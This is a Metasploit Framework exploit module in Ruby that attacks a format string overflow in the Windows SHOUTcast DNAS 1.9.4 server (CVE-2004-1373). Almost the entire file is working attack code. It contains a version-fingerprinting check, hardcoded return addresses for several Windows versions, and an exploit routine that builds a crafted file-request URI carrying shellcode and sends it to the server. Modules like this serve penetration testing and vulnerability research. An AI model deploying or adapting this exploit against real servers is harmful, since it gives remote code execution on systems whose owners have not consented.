##
# $Id: shoutcast_format.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SHOUTcast DNAS/win32 1.9.4 File Request Format String Overflow',
			'Description'    => %q{
					This module exploits a format string vulnerability in the
				Nullsoft SHOUTcast server for Windows. The vulnerability is
				triggered by requesting a file path that contains format
				string specifiers. This vulnerability was discovered by
				Tomasz Trojanowski and Damian Put.
			},
			'Author'         => [ 'MC', 'mandragore[at]gmail.com'],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2004-1373'],
					[ 'OSVDB', '12585'],
					[ 'BID', '12096'],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 250,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows NT SP5/SP6a English',    { 'Ret' => 0x776a1799 }], # ws2help.dll
					['Windows 2000 English ALL',       { 'Ret' => 0x75022ac4 }], # ws2help.dll
					['Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad }], # ws2help.dll
					['Windows 2003 Server English',    { 'Ret' => 0x7ffc0638 }], # PEB return
				],
			'DisclosureDate' => 'Dec 23 2004'))

		register_options(
			[
				Opt::RPORT(8000)
			], self.class)
	end

	def check
		r = send_request_raw({
			'uri' => uri
		}, 5)

		return Exploit::CheckCode::Safe if not r

		m = r.body.match(/Network Audio Server\/([^\s]+)\s+([^<]+)<BR/)
		return Exploit::CheckCode::Safe if not m

		print_status("This system is running SHOUTcast #{m[1]} on #{m[2]}")

		# SHOUTcast Distributed Network Audio Server/win32 v1.9.2<BR>
		if (m[1] =~ /v1\.([0-8]\.|9\.[0-3])$/)
			if (m[2] == "win32")
				return Exploit::CheckCode::Vulnerable
			end
			print_status("Vulnerable version detected, but not a win32 host")
		end

		return Exploit::CheckCode::Safe
	end

	def exploit

		num = 1046 - payload.encoded.length
		uri = '/content/%#0' + num.to_s + 'x' + payload.encoded
		uri << "\xeb\x06" + rand_text_alphanumeric(2)
		uri << [target.ret].pack('V')
		uri << "\xe9\x2d\xff\xff\xff"
		uri << '#0100x.mp3'

		print_status("Trying to exploit target #{target.name} 0x%.8x" % target.ret)
		send_request_raw({
			'uri' => uri
		}, 5)

		handler
		disconnect
	end

end
